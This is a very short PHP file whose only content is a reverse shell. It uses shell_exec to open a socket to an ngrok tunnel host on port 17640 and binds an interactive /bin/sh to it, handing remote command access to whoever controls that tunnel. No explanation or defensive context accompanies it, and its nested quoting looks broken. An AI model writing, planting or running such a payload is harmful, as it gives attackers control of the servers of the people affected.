<?php

shell_exec("php -r '$sock=fsockopen("0.tcp.ap.ngrok.io:",17640);exec("/bin/sh -i <&3 >&3 2>&3");'");

?>
